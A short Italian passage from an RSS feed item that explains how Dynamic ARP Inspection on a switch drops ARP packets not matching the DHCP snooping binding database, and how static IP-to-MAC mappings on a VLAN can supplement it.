&lt;p&gt;Quando DAI è abilitato, lo switch elimina il pacchetto ARP se l&amp;rsquo;indirizzo MAC e l&amp;rsquo;indirizzo IP del mittente non corrispondono a una voce nel database dei binding di snooping DHCP.  Tuttavia, può essere superato attraverso mappature statiche.  I mapping statici sono utili quando gli host configurano indirizzi IP statici, lo snooping DHCP non può essere eseguito o altri switch nella rete non eseguono l&amp;rsquo;ispezione ARP dinamica.  Una mappatura statica associa un indirizzo IP a un indirizzo MAC su una VLAN.&lt;/p&gt;
</content>
    </item>
    
  </channel>
</rss>
